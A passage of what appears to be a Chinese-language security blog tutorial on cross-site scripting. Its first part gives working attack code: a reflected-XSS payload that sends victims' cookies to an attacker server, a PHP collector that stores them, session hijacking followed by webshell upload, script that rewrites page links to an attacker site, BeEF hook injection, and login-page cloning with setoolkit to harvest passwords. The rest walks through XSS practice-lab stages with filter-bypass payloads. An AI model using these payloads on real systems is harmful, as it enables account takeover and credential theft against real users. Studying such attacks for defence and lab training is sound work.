class="headerlink" title="cookie介绍"></a>cookie介绍</h3><p>某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）</p><p>在http协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，它可包含有关用户的信息</p><p>目前cookie有临时的也有持续的，临时的只在浏览器上保存一段时间，超过规定时间，该cookie会被系统清除。</p><p>服务器可以利用cookie包含信息的任意性来筛选或经常性维护这些信息，以判断在http传输中的状态。</p><p>典型应用为判断注册用户是否已经登录网站；提示用户是否保存账号，保留用户信息，简化下次登录；购物车结账（在不同页面下选择的同一家的商品）信息都会写入到cookies。</p><h3 id="反射xss盗取cookie"><a href="#反射xss盗取cookie" class="headerlink" title="反射xss盗取cookie"></a>反射xss盗取cookie</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?uname=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://ip/xss_test/cookie.php?cookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>将连接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。</p><p><code>cookie.php</code>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">file_put_contents(<span class="string">'cookie.txt'</span>,$cookie);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>cookie 接受cookie参数，写入到cookie.txt</p></blockquote><h3 id="利用cookie会话劫持"><a href="#利用cookie会话劫持" class="headerlink" title="利用cookie会话劫持"></a>利用cookie会话劫持</h3><p>burp登录界面修改cookie，成功登录</p><h3 id="劫持会话后的操作"><a href="#劫持会话后的操作" class="headerlink" title="劫持会话后的操作"></a>劫持会话后的操作</h3><p> 1.修改配置文件<br> 2.上传webshell</p><h2 id="篡改网页链接"><a href="#篡改网页链接" class="headerlink" title="篡改网页链接"></a>篡改网页链接</h2><h3 id="js代码讲解"><a href="#js代码讲解" class="headerlink" title="js代码讲解"></a>js代码讲解</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> link=<span class="built_in">document</span>.getElementsByTagName(<span class="string">"a"</span>);</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;link.length;j++)&#123;</span><br><span class="line">    link[j].href=<span class="string">"http://attacker-site.com/"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>window.onload 当窗口加载时，执行匿名函数。<br>使用for循环遍历所有获得的连接a标签</p></blockquote><h3 id="xss篡改链接"><a href="#xss篡改链接" class="headerlink" title="xss篡改链接"></a>xss篡改链接</h3><p>在xss位置输入上面代码</p><h3 id="篡改链接指向流量url"><a href="#篡改链接指向流量url" class="headerlink" title="篡改链接指向流量url"></a>篡改链接指向流量url</h3><p>刷流量，上述代码修改url</p><h3 id="篡改链接指向恶意url"><a href="#篡改链接指向恶意url" class="headerlink" title="篡改链接指向恶意url"></a>篡改链接指向恶意url</h3><p>beef 进行恶意链接生成，以及利用hook.js执行其他命令。<br>kali中终端输入<code>beef-xss</code>启动beef并生成恶意链接,</p><p>开启一个服务器( <code>service apache2 start</code>  )，将下面代码写入到代码（/var/www/index.html）当中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"http://ip[:port]/hook.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>最后修改url至攻击者的服务器页面，点击即触发。</p><h2 id="盗取用户信息"><a href="#盗取用户信息" class="headerlink" title="盗取用户信息"></a>盗取用户信息</h2><h3 id="盗取用户信息原理"><a href="#盗取用户信息原理" class="headerlink" title="盗取用户信息原理"></a>盗取用户信息原理</h3><p>克隆网站登录界面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆的登录页面，用户输入登录，账号密码被存储。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[用户] --&gt; |访问| B[原始站点有存xss漏洞]</span><br><span class="line">B --&gt; |跳转| C[克隆站点]</span><br><span class="line">A --&gt; |输入账号密码|C</span><br><span class="line">C--&gt;|用户输入账号密码|D(成功获取并存储)</span><br></pre></td></tr></table></figure><h3 id="setoolkit工具克隆网站"><a href="#setoolkit工具克隆网站" class="headerlink" title="setoolkit工具克隆网站"></a>setoolkit工具克隆网站</h3><p>万能的社工工具<br>Select from the menu: <code>从菜单中选择:</code></p><p>   1) Social-Engineering Attacks <code>社会工程学攻击</code><br>   2) Penetration Testing (Fast-Track) <code>穿透测试(快速通道)</code><br>   3) Third Party Modules <code>第三方模块</code><br>   4) Update the Social-Engineer Toolkit <code>更新社交工程师工具包</code><br>   5) Update SET configuration <code>更新集合配置</code><br>   6) Help, Credits, and About <code>帮助，学分，等等</code></p><blockquote><p> 选中1<br>    1) Spear-Phishing Attack Vectors <code>鱼叉式钓鱼攻击载体</code><br>    2) Website Attack Vectors <code>网站攻击载体</code><br>    3) Infectious Media Generator <code>感染介质发生器</code><br>    4) Create a Payload and Listener <code>创建一个有效负载和侦听器</code><br>    5) Mass Mailer Attack <code>大规模邮件攻击</code><br>    6) Arduino-Based Attack Vector <code>基于arduino的攻击向量</code><br>    7) Wireless Access Point Attack Vector <code>无线接入点攻击向量</code><br>    8) QRCode Generator Attack Vector <code>QRCode生成器攻击向量</code><br>    9) Powershell Attack Vectors <code>Powershell攻击向量</code><br>    10) Third Party Modules <code>第三方模块</code><br> 选中2<br>    1) Java Applet Attack Method <code>Java Applet攻击方法</code><br>    2) Metasploit Browser Exploit Method <code>Metasploit浏览器利用方法</code><br>    3) Credential Harvester Attack Method <code>凭证收割机攻击方法</code><br>    4) Tabnabbing Attack Method <code>制表攻击法</code><br>    5) Web Jacking Attack Method <code>顶网攻击方法</code><br>    6) Multi-Attack Web Method <code>多攻击Web方法</code><br>    7) HTA Attack Method <code>HTA攻击方法</code><br> 选中3<br>    1) Web Templates <code>网页模板</code><br>    2) Site Cloner <code>现场切割</code><br>    3) Custom Import <code>自定义导入</code><br> 选中2</p></blockquote><p>Enter the IP address for POST back in Harvester/Tabnabbing: (默认会使用网卡上的地址)<br>Enter the url to clone:<code>输入要克隆的站点url</code></p><h3 id="存储xss跳转克隆网站"><a href="#存储xss跳转克隆网站" class="headerlink" title="存储xss跳转克隆网站"></a>存储xss跳转克隆网站</h3><p>xss payload: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=<span class="string">"http://ip/"</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="查看盗取账号和密码"><a href="#查看盗取账号和密码" class="headerlink" title="查看盗取账号和密码"></a>查看盗取账号和密码</h3><p>在setoolkit终端中查看账号密码</p><h2 id="没有过滤的xss"><a href="#没有过滤的xss" class="headerlink" title="没有过滤的xss"></a>没有过滤的xss</h2><h3 id="实验环境介绍"><a href="#实验环境介绍" class="headerlink" title="实验环境介绍"></a>实验环境介绍</h3><p>一个日本安全研究员制作的xss练习靶场<br><a href="https://xss-quiz.int21h.jp/" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/</a><br>在IE浏览器中打开</p><h3 id="闭合文本标签利用xss"><a href="#闭合文本标签利用xss" class="headerlink" title="闭合文本标签利用xss"></a>闭合文本标签利用xss</h3><p>打开审查工具，查看代码</p><blockquote><p>stage #1 </p><p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></p></blockquote><p>简单payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>闭合payload:  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="属性中的xss"><a href="#属性中的xss" class="headerlink" title="属性中的xss"></a>属性中的xss</h2><h3 id="配置chrome关闭xss-auditor"><a href="#配置chrome关闭xss-auditor" class="headerlink" title="配置chrome关闭xss-auditor"></a>配置chrome关闭xss-auditor</h3><p>右键Chrome快捷方式，选择属性，复制文件位置，创建快捷方式，粘贴，并在后面加上<code>--args --disable-xss-auditor</code> ,最后给快捷方式命名，完成。</p><p>之后就不用IE了，改用Chrome。 </p><h3 id="属性中xss发现"><a href="#属性中xss发现" class="headerlink" title="属性中xss发现"></a>属性中xss发现</h3><p>Ctrl+f<br>代码审查</p><blockquote><p>stage #2 </p><p> <a href="http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c</a></p></blockquote><p>属性中xss闭合引入script</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>属性中xss闭合引入事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onmouseover=alert(document.domain);&gt;</span></span><br></pre></td></tr></table></figure><h2 id="选择列表中的xss"><a href="#选择列表中的xss" class="headerlink" title="选择列表中的xss"></a>选择列表中的xss</h2><h3 id="html-select-标签介绍"><a href="#html-select-标签介绍" class="headerlink" title="html select 标签介绍"></a>html select 标签介绍</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;name&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>select&gt;</span><br></pre></td></tr></table></figure><h3 id="表单介绍"><a href="#表单介绍" class="headerlink" title="表单介绍"></a>表单介绍</h3><p>html表单用于搜集不同类型的用户输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"?sid=..."</span> method=<span class="string">"post"</span>&gt;&lt;<span class="regexp">/form&gt;</span></span><br></pre></td></tr></table></figure><p>burp测试</p><blockquote><p>stage #3 </p><p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d</a></p></blockquote><p>抓取，p2储存在漏洞<br>payload: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2=japan&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="选择参数中的xss"><a href="#选择参数中的xss" class="headerlink" title="选择参数中的xss"></a>选择参数中的xss</h2><h3 id="html表单隐藏参数介绍"><a href="#html表单隐藏参数介绍" class="headerlink" title="html表单隐藏参数介绍"></a>html表单隐藏参数介绍</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"..."</span> value=<span class="string">"..."</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="html中svg介绍"><a href="#html中svg介绍" class="headerlink" title="html中svg介绍"></a>html中svg介绍</h3><p>svg：<br>意为可缩放的矢量图形，使用xml格式定义图像<br>可通过以下标签嵌入html文档：<code>&lt;wmbed&gt;</code>,<code>&lt;object&gt;</code>或者<code>&lt;iframe&gt;</code>，也可以使用<code>&lt;svg&gt;</code>标签嵌入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/事件=<span class="string">""</span>&gt;</span><br><span class="line">&lt;svg/onload=alert(<span class="built_in">document</span>.domain)&gt;%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h3 id="闭合触发xss"><a href="#闭合触发xss" class="headerlink" title="闭合触发xss"></a>闭合触发xss</h3><blockquote><p>stage #4 </p><p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c</a></p></blockquote><p>payload: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="限制输入长度的xss"><a href="#限制输入长度的xss" class="headerlink" title="限制输入长度的xss"></a>限制输入长度的xss</h2><h3 id="html-表单文本框介绍"><a href="#html-表单文本框介绍" class="headerlink" title="html 表单文本框介绍"></a>html 表单文本框介绍</h3><p>html表单用于搜集不同类型的用户输入；表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等；这里介绍text定义常规文本输入。</p><p>属性介绍：</p><p>value 规定输入字段的初始值</p><p>readonly 规定输入字段为只读</p><p>disabled 规定输入字段是禁用的。被禁用的元素不可用，不可点击，不会提交。</p><p>size 规定输入字段的字符</p><p>maxlength 规定输入字段允许的最大长度</p><h3 id="xss-payload长度计算"><a href="#xss-payload长度计算" class="headerlink" title="xss payload长度计算"></a>xss payload长度计算</h3><p>利用python len函数,如下，结果为40字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = <span class="string">"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(payload)</span><br></pre></td></tr></table></figure><h3 id="浏览器审查工具修改源码"><a href="#浏览器审查工具修改源码" class="headerlink" title="浏览器审查工具修改源码"></a>浏览器审查工具修改源码</h3><blockquote><p>stage #5 </p><p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268</a></p></blockquote><p>paylaod: 先修改maxlength</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="payload-触发xss漏洞"><a href="#payload-触发xss漏洞" class="headerlink" title="payload 触发xss漏洞"></a>payload 触发xss漏洞</h3><p>随着安全意识的提高，script可能会被过滤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(document.domaim)&gt;%0a</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">111</span><span class="string">" onmouseover="</span>alert(<span class="built_in">document</span>.domain)<span class="string">"</span></span><br></pre></td></tr></table></figure><h2 id="html事件中的xss"><a href="#html事件中的xss" class="headerlink" title="html事件中的xss"></a>html事件中的xss</h2><h3 id="html事件介绍"><a href="#html事件介绍" class="headerlink" title="html事件介绍"></a>html事件介绍</h3><p>在现代浏览器中内置有大量的事件处理器，监事特定的条件或用户行为，例如鼠标点击（onclick）或浏览器窗口完成加载某个图像（onload）。通过使用客户端的js,可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行一个或多个javascript命令或函数</p><h3 id="xss漏洞发现"><a href="#xss漏洞发现" class="headerlink" title="xss漏洞发现"></a>xss漏洞发现</h3><blockquote><p>stage #6 </p><p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0</a></p></blockquote><p> 审查代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>+"<span class="attr">132456</span>"&gt;</span></span><br></pre></td></tr></table></figure><h3 id="闭合思路分析"><a href="#闭合思路分析" class="headerlink" title="闭合思路分析"></a>闭合思路分析</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onmouseover="</span>alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a</span></span><br></pre></td></tr></table></figure><h3 id="payload触发xss漏洞"><a href="#payload触发xss漏洞" class="headerlink" title="payload触发xss漏洞"></a>payload触发xss漏洞</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onclick="</span>alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><h2 id="空格分隔属性的xss"><a href="#空格分隔属性的xss" class="headerlink" title="空格分隔属性的xss"></a>空格分隔属性的xss</h2><h3 id="xss探测"><a href="#xss探测" class="headerlink" title="xss探测"></a>xss探测</h3><blockquote><p>stage #7 </p><p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8</a></p></blockquote><h3 id="触发xss"><a href="#触发xss" class="headerlink" title="触发xss"></a>触发xss</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span> onmouseover=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><h2 id="javascript伪协议的xss"><a href="#javascript伪协议的xss" class="headerlink" title="javascript伪协议的xss"></a>javascript伪协议的xss</h2><h3 id="javascript伪协议介绍"><a href="#javascript伪协议介绍" class="headerlink" title="javascript伪协议介绍"></a>javascript伪协议介绍</h3><p>将js 代码添加到客户端，方法是把它放置在伪协议说明符<code>javascript:</code>后的url中。</p><p>他声明了url的主题是任意javascript，它由javascript的解释器运行，若果javascript:url中的js代码含有多个语句，必须要用<code>;</code>讲这些语句分隔开</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:<span class="keyword">var</span> now = now Data();<span class="string">"&lt;h1&gt;this item&lt;/h1&gt;"</span> + now;</span><br></pre></td></tr></table></figure><p>js 还可以只含有动作，但不返回值得js语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure><p>xss漏洞发现并触发</p><p>设置第一无二字符串提交，在响应中寻找。</p><blockquote><p>stage #8 </p><p><a href="http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(document.domain)"</span>&gt;</span>javascript:alert(document.domain)<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="utf-7-xss"><a href="#utf-7-xss" class="headerlink" title="utf-7 xss"></a>utf-7 xss</h2><blockquote><p>stage #9 </p><p><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456</a></p></blockquote><p>这里的utf-7 现在的浏览器已经移除了这种编码，危害较小</p><p>所以这里取巧：</p><p><img src="xss_stage9.png" alt=""></p><p><img src="xss_stage9_1.png" alt=""></p><p><img src="xss_stage9_2.png" alt=""></p><p>或者 点击跳过这关</p><p><img src="xss_stage.png" alt=""></p><h2 id="绕过过滤domain为空的xss"><a href="#绕过过滤domain为空的xss" class="headerlink" title="绕过过滤domain为空的xss"></a>绕过过滤domain为空的xss</h2><blockquote><p>stage #10 </p><p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d</a></p></blockquote><p><img src="xss_stage10.png" alt=""></p><p><img src="xss_stage10_1.png" alt=""></p><p><img src="xss_stage10_2.png" alt=""></p><p><img src="xss_stage10_3.png" alt=""></p><p>domain被过滤，采取双写，编码绕过</p><p>双写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;svg/onload=alert(document.domdomainain)&gt;%0a</span></span><br></pre></td></tr></table></figure><p>这里使用base64编绕过，也可以采用其他</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;script&gt;eval(atob("</span>YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==<span class="string">"));&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="绕过替换script和on事件的xss"><a href="#绕过替换script和on事件的xss" class="headerlink" title="绕过替换script和on事件的xss"></a>绕过替换script和on事件的xss</h2><blockquote><p>stage #11</p><p><a href="https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a</a></p></blockquote><p>在伪协议中带空格仍然能执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;a href="</span>javasc ript:alert(<span class="built_in">document</span>.domain);<span class="string">"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="xss_stage11.png" alt=""></p><p>然而，404,空格换一下在script中间插入<code>&amp;#09;</code>，<code>&amp;#10;</code>，空格等不可见字符，让正则匹配不到。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123"&gt;&lt;a href="javasc&amp;#10;ript:alert(document.domain);"&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="IE特性绕过xss过滤"><a href="#IE特性绕过xss过滤" class="headerlink" title="IE特性绕过xss过滤"></a>IE特性绕过xss过滤</h2><blockquote><p>stage #12</p><p><a href="https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b</a></p></blockquote><p>这里过滤了&lt;,”,ie,有一特性  两个  `  号 可闭合 “</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">``</span> onmouseover=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><h2 id="css-特性绕过xss过滤"><a href="#css-特性绕过xss过滤" class="headerlink" title="css 特性绕过xss过滤"></a>css 特性绕过xss过滤</h2><blockquote><p>stage #13</p><p><a href="https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2</a></p></blockquote><p>同样是在ie中，css特性： <code>;background:url(&quot;javascript:alert(document.dmain);&quot;)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-color:salmon;background:url(<span class="string">"javascript:alert(document.domain);"</span>)</span><br></pre></td></tr></table></figure><h2 id="css触发xss"><a href="#css触发xss" class="headerlink" title="css触发xss"></a>css触发xss</h2><h3 id="css介绍"><a href="#css介绍" class="headerlink" title="css介绍"></a>css介绍</h3><p>层叠样式表是一种用来表现html或xml等文件样式的计算机语言。css不仅可以静态的修饰网页，还可以配合各种脚本语言动态的对网页各元素进行格式化。</p><h3 id="css中执行js"><a href="#css中执行js" class="headerlink" title="css中执行js"></a>css中执行js</h3><p>css expression(css 表达式)又称Dymamic properties(动态属性)是早期微软DHTML的产物，以其可以在css中定义表达式（公式）来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题、微软IE8 bate2标准模式开始，取消对css expression的支持。（实际应用：导航栏，返回顶部）</p><h3 id="注释绕过关键字过滤"><a href="#注释绕过关键字过滤" class="headerlink" title="注释绕过关键字过滤"></a>注释绕过关键字过滤</h3><blockquote><p>stage #14</p><p><a href="https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2</a></p></blockquote><p><code>/**/</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss:expres<span class="comment">/**/sion(if(!window.x)&#123;alert(document.domain);window.x=1;&#125;)</span></span><br></pre></td></tr></table></figure><h2 id="16进制绕过过滤触发xss"><a href="#16进制绕过过滤触发xss" class="headerlink" title="16进制绕过过滤触发xss"></a>16进制绕过过滤触发xss</h2><p>符号 -&gt; 16</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"\\x"</span>+binascii.b2a_hex(<span class="string">"&lt;"</span>)</span><br></pre></td></tr></table></figure><p>带上\x,js 可识别 </p><blockquote><p>stage #15</p><p><a href="https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e</a></p></blockquote><p>经检测，&lt; &gt; \ 被过滤，&lt; 16进制为3c  &gt;16进制为3e</p><p><img src="xss_stage15.png" alt=""></p><p><img src="xss_stage15_1.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\x3cscript\\x3ealert(<span class="built_in">document</span>.domain);\\x3c/script\\x3e</span><br></pre></td></tr></table></figure><h2 id="Ascii绕过过滤触发xss"><a href="#Ascii绕过过滤触发xss" class="headerlink" title="Ascii绕过过滤触发xss"></a>Ascii绕过过滤触发xss</h2><p>符号 -&gt; ascii</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"\\u00"</span> + binascii.b2a_hex(<span 